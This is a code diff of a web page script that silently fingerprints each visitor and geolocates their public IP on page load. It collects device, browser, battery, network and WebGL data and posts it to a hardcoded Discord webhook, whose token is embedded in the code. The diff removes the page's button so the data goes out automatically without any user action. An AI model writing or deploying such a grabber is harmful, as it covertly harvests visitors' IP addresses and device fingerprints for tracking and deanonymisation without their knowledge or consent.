@@ -16,12 +16,6 @@
         h1 {
             margin-top: 20px;
         }
-        button {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
@@ -30,7 +24,6 @@
 
     <script>
         async function collectData() {
-            // Function to get the operating system
             function getOS() {
                 const platform = navigator.platform.toLowerCase();
                 if (platform.includes('win')) return 'Windows';
@@ -41,33 +34,31 @@
                 return 'Unknown';
             }
 
-            // Function to measure network speed
             async function measureNetworkSpeed() {
-                const url = 'https://www.example.com/smallfile'; // Replace with the URL of a small file on your server
+                const url = 'https://www.example.com/smallfile'; // Replace with your URL
                 const startTime = Date.now();
-                return new Promise((resolve, reject) => {
-                    fetch(url, { method: 'GET', mode: 'no-cors' })
-                        .then(response => response.blob())
-                        .then(blob => {
-                            const endTime = Date.now();
-                            const duration = (endTime - startTime) / 1000; // in seconds
-                            const fileSize = blob.size / 1024; // in KB
-                            const speed = (fileSize / duration).toFixed(2); // KB/s
-                            resolve(speed);
-                        })
-                        .catch(reject);
-                });
+                try {
+                    const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
+                    const blob = await response.blob();
+                    const endTime = Date.now();
+                    const duration = (endTime - startTime) / 1000; // in seconds
+                    const fileSize = blob.size / 1024; // in KB
+                    const speed = (fileSize / duration).toFixed(2); // KB/s
+                    return speed;
+                } catch (error) {
+                    console.error("Network speed measurement failed:", error);
+                    return 'Unknown';
+                }
             }
 
-            // Function to get network information
             function getNetworkInformation() {
                 if (navigator.connection) {
                     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || navigator.msConnection;
                     return {
-                        type: connection.type,
-                        effectiveType: connection.effectiveType,
-                        downlink: connection.downlink,
-                        rtt: connection.rtt
+                        type: connection.type || 'Unknown',
+                        effectiveType: connection.effectiveType || 'Unknown',
+                        downlink: connection.downlink || 'Unknown',
+                        rtt: connection.rtt || 'Unknown'
                     };
                 }
                 return {
@@ -78,23 +69,21 @@
                 };
             }
 
-            // Function to get IP address and geolocation data
             function getIPAddress(callback) {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://api.ipify.org?format=json', true);
                 xhr.onreadystatechange = function() {
-                    if (xhr.readyState == 4 && xhr.status == 200) {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
                         const response = JSON.parse(xhr.responseText);
                         const ip = response.ip;
 
-                        // Get geolocation data
                         const geoXhr = new XMLHttpRequest();
                         geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
                         geoXhr.onreadystatechange = function() {
-                            if (geoXhr.readyState == 4 && geoXhr.status == 200) {
+                            if (geoXhr.readyState === 4 && geoXhr.status === 200) {
                                 const geoResponse = JSON.parse(geoXhr.responseText);
-                                const country = geoResponse.country_name;
-                                const continent = geoResponse.continent_code;
+                                const country = geoResponse.country_name || 'Unknown';
+                                const continent = geoResponse.continent_code || 'Unknown';
                                 callback(ip, country, continent);
                             }
                         };
@@ -104,7 +93,6 @@
                 xhr.send();
             }
 
-            // Function to get battery status
             async function getBatteryStatus() {
                 try {
                     const battery = await navigator.getBattery();
@@ -121,15 +109,14 @@
                 }
             }
 
-            // Function to get WebGL data
             function getWebGLData() {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     return {
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown'
                     };
                 }
                 return {
@@ -138,7 +125,22 @@
                 };
             }
 
-            // Collect all data
+            function getCPUInfo() {
+                const userAgent = navigator.userAgent;
+                const cpu = userAgent.match(/\b(?:Intel|AMD)\b|\bx86_64\b|\barm\b|\barm64\b/i);
+                return cpu ? cpu[0] : 'Unknown';
+            }
+
+            function getRAMInfo() {
+                // Browsers do not expose RAM information directly
+                return 'Unknown';
+            }
+
+            function getMotherboardInfo() {
+                // Browsers do not expose motherboard information directly
+                return 'Unknown';
+            }
+
             const ipPromise = new Promise((resolve) => {
                 getIPAddress((ip, country, continent) => {
                     resolve({ ip, country, continent });
@@ -161,7 +163,7 @@
                 renderingEngine: navigator.product,
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
                 screenColorDepth: window.screen.colorDepth,
-                screenOrientation: window.screen.orientation.type,
+                screenOrientation: window.screen.orientation?.type || 'Unknown',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 operatingSystem: getOS(),
                 language: navigator.language,
@@ -185,9 +187,6 @@
                 localTime: new Date().toLocaleString(),
                 windowInnerDimensions: `${window.innerWidth}x${window.innerHeight}`,
                 documentDimensions: `${document.documentElement.scrollWidth}x${document.documentElement.scrollHeight}`,
-                browserName: navigator.userAgent.match(/(firefox|msie|chrome|safari|trident)/gi)?.[0] || 'Unknown',
-                browserMajorVersion: parseInt(navigator.userAgent.match(/(firefox|msie|chrome|safari|trident)\/?\s*(\d+)/i)?.[2]) || 'Unknown',
-                preferredLanguages: navigator.languages.join(', '),
                 viewportScale: window.devicePixelRatio,
                 pageVisibility: document.visibilityState,
                 audioContext: window.AudioContext ? 'Supported' : 'Not Supported',
@@ -198,86 +197,100 @@
                 webGLRenderer: getWebGLData().renderer,
                 webGLVendor: getWebGLData().vendor,
                 timezoneOffset: new Date().getTimezoneOffset(),
-                cpuClass: navigator.userAgent.match(/(arm|x86|x64)/gi)?.[0] || 'Unknown',
+                cpuClass: getCPUInfo(),
+                ram: getRAMInfo(),
+                motherboard: getMotherboardInfo(),
                 deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                 cssFeatures: {
                     grid: CSS.supports('display', 'grid') ? 'Supported' : 'Not Supported',
                     flex: CSS.supports('display', 'flex') ? 'Supported' : 'Not Supported'
                 },
                 jsFeatures: {
-                    es6: typeof Symbol != 'undefined' ? 'Supported' : 'Not Supported',
-                    promises: typeof Promise != 'undefined' ? 'Supported' : 'Not Supported'
+                    es6: typeof Symbol !== 'undefined' ? 'Supported' : 'Not Supported',
+                    promises: typeof Promise !== 'undefined' ? 'Supported' : 'Not Supported'
                 }
             };
         }
 
-        // Send the collected data to Discord webhook
         async function sendData() {
             const data = await collectData();
             const xhr = new XMLHttpRequest();
-            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s'; // Replace with your Discord webhook URL
+            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s'; // Your Discord webhook URL
             xhr.open('POST', url, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
 
             const payload = JSON.stringify({
-                content: `**Collected Data**
-IP Address: ${data.ip}
-Country: ${data.country}
-Continent: ${data.continent}
-Device: ${data.device}
-Browser: ${data.browser}
-Browser Version: ${data.browserVersion}
-Rendering Engine: ${data.renderingEngine}
-Screen Resolution: ${data.screenResolution}
-Screen Color Depth: ${data.screenColorDepth}
-Screen Orientation: ${data.screenOrientation}
-Timezone: ${data.timezone}
-Operating System: ${data.operatingSystem}
-Language: ${data.language}
-Cookies Enabled: ${data.cookiesEnabled}
-Online Status: ${data.onlineStatus}
-Java Enabled: ${data.javaEnabled}
-Referrer: ${data.referrer}
-Platform: ${data.platform}
-Vendor: ${data.vendor}
-Device Memory: ${data.deviceMemory}
-Connection Type: ${data.connectionType}
-Effective Connection Type: ${data.effectiveConnectionType}
-Downlink: ${data.downlink}
-RTT: ${data.rtt}
-Network Speed: ${data.networkSpeed}
-Hardware Concurrency: ${data.hardwareConcurrency}
-Max Touch Points: ${data.maxTouchPoints}
-Battery Level: ${data.batteryLevel}
-Battery Charging: ${data.batteryCharging}
-Do Not Track: ${data.doNotTrack}
-Local Time: ${data.localTime}
-Window Inner Dimensions: ${data.windowInnerDimensions}
-Document Dimensions: ${data.documentDimensions}
-Browser Name: ${data.browserName}
-Browser Major Version: ${data.browserMajorVersion}
-Preferred Languages: ${data.preferredLanguages}
-Viewport Scale: ${data.viewportScale}
-Page Visibility: ${data.pageVisibility}
-Audio Context: ${data.audioContext}
-Touch Capabilities: ${data.touchCapabilities}
-Installed Plugins: ${data.installedPlugins}
-Media Devices: ${data.mediaDevices}
-Storage Quota: ${data.storageQuota}
-WebGL Renderer: ${data.webGLRenderer}
-WebGL Vendor: ${data.webGLVendor}
-Timezone Offset: ${data.timezoneOffset}
-CPU Class: ${data.cpuClass}
-Device Type: ${data.deviceType}
-CSS Features: ${JSON.stringify(data.cssFeatures)}
-JavaScript Features: ${JSON.stringify(data.jsFeatures)}
-`
+                content: `**Collected Data**\n\n` +
+                    `**IP Information**\n` +
+                    `IP Address: ${data.ip}\n` +
+                    `Country: ${data.country}\n` +
+                    `Continent: ${data.continent}\n\n` +
+                    `**Device Information**\n` +
+                    `Device: ${data.device}\n` +
+                    `Operating System: ${data.operatingSystem}\n` +
+                    `Device Type: ${data.deviceType}\n` +
+                    `CPU Class: ${data.cpuClass}\n` +
+                    `RAM: ${data.ram}\n` +
+                    `Motherboard: ${data.motherboard}\n` +
+                    `Hardware Concurrency: ${data.hardwareConcurrency}\n` +
+                    `Device Memory: ${data.deviceMemory}\n` +
+                    `Max Touch Points: ${data.maxTouchPoints}\n` +
+                    `Battery Level: ${data.batteryLevel}\n` +
+                    `Battery Charging: ${data.batteryCharging}\n\n` +
+                    `**Browser Information**\n` +
+                    `Browser: ${data.browser}\n` +
+                    `Browser Version: ${data.browserVersion}\n` +
+                    `Rendering Engine: ${data.renderingEngine}\n` +
+                    `Language: ${data.language}\n` +
+                    `Cookies Enabled: ${data.cookiesEnabled}\n` +
+                    `Online Status: ${data.onlineStatus}\n` +
+                    `Java Enabled: ${data.javaEnabled}\n` +
+                    `Do Not Track: ${data.doNotTrack}\n` +
+                    `Referrer: ${data.referrer}\n` +
+                    `Platform: ${data.platform}\n` +
+                    `Vendor: ${data.vendor}\n` +
+                    `User Agent: ${data.device}\n\n` +
+                    `**Screen Information**\n` +
+                    `Screen Resolution: ${data.screenResolution}\n` +
+                    `Screen Color Depth: ${data.screenColorDepth}\n` +
+                    `Screen Orientation: ${data.screenOrientation}\n\n` +
+                    `**Network Information**\n` +
+                    `Connection Type: ${data.connectionType}\n` +
+                    `Effective Connection Type: ${data.effectiveConnectionType}\n` +
+                    `Downlink: ${data.downlink}\n` +
+                    `RTT: ${data.rtt}\n` +
+                    `Network Speed: ${data.networkSpeed}\n\n` +
+                    `**Other Information**\n` +
+                    `Timezone: ${data.timezone}\n` +
+                    `Timezone Offset: ${data.timezoneOffset}\n` +
+                    `Local Time: ${data.localTime}\n` +
+                    `Window Inner Dimensions: ${data.windowInnerDimensions}\n` +
+                    `Document Dimensions: ${data.documentDimensions}\n` +
+                    `Viewport Scale: ${data.viewportScale}\n` +
+                    `Page Visibility: ${data.pageVisibility}\n` +
+                    `Audio Context: ${data.audioContext}\n` +
+                    `Touch Capabilities: ${data.touchCapabilities}\n` +
+                    `Installed Plugins: ${data.installedPlugins}\n` +
+                    `Media Devices: ${data.mediaDevices}\n` +
+                    `Storage Quota: ${data.storageQuota}\n` +
+                    `WebGL Renderer: ${data.webGLRenderer}\n` +
+                    `WebGL Vendor: ${data.webGLVendor}\n\n` +
+                    `**CSS Features**\n` +
+                    `Grid: ${data.cssFeatures.grid}\n` +
+                    `Flex: ${data.cssFeatures.flex}\n\n` +
+                    `**JavaScript Features**\n` +
+                    `ES6: ${data.jsFeatures.es6}\n` +
+                    `Promises: ${data.jsFeatures.promises}`,
+                embeds: [{
+                    image: {
+                        url: 'https://c.tenor.com/EOqDFl4-zvUAAAAM/yippee-reverse.gif'
+                    }
+                }]
             });
 
             xhr.send(payload);
         }
 
-        // Automatically send the data when the page loads
         sendData();
     </script>
 </body>
